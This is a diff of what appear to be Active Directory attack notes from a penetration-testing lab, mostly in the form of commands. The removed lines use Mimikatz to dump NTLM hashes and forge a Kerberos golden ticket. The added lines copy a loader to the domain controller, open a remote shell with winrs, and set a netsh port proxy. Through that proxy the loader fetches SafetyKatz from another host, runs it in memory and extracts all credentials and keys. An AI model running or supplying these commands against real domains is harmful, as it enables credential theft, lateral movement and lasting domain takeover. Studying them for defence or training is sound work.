@@ -1,24 +1,3 @@
-### **ASSICURATI CHE STIA RUNNANDO COME PRIVILEGED**
-```powershell
-privilege::debug
-```
-### **DUMPA LE NTLM HASH**
-```powershell
-lsadump::lsa /patch
-```
-![file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/2.png](file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/2.png)
-### **GOLDEN TICKET**
-Crei un ticket per poter loggare quando vuoi
-```MSF
-golden_ticket_create //MSF
-```
-```MSF
-lsadump::lsa /inject /name:krbtgt
-```
-per creare il golden ticket
-```MSF
-kerberos::golden /user: /domain: /sid: /krbtgt: /id:
-```
 
 ### **OVERPASS THE HASH**
 *Using SafetyKatz*
@@ -31,7 +10,23 @@ Find-PSRemotingLocalAdminAccess -Verbose
 ```
 
 ### **Extract Credentials**
-Use loader.exe
+Copy the loader on the dc and use the port forwarding technique to use mimikatz and extract all creds
+```powershell
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+```
+```powershell
+winrs -r:dcorp-dc cmd
+```
+```powershell
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.115
+```
+```powershell
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
+```
+```mimikatz
+lsadump::lsa /patch
+```
+
 ```powershell
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
 ```
